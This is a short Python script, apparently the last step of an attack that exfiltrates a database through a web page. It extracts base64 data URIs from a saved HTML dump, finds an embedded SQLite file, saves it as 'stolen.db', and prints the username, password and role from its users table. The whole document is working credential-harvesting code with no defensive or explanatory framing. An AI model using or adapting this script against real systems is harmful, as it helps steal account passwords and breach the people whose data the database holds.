import re, base64, sqlite3

html = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
matches = re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html)

for m in matches:
    try:
        data = base64.b64decode(m)
    except Exception:
        continue

    if data[:6] == b'SQLite':
        open('/tmp/stolen.db', 'wb').write(data)
        conn = sqlite3.connect('/tmp/stolen.db')
        for row in conn.execute("SELECT username, password, role FROM users"):
            print(f"{row[0]}:{row[1]} ({row[2]})")
        conn.close()
        break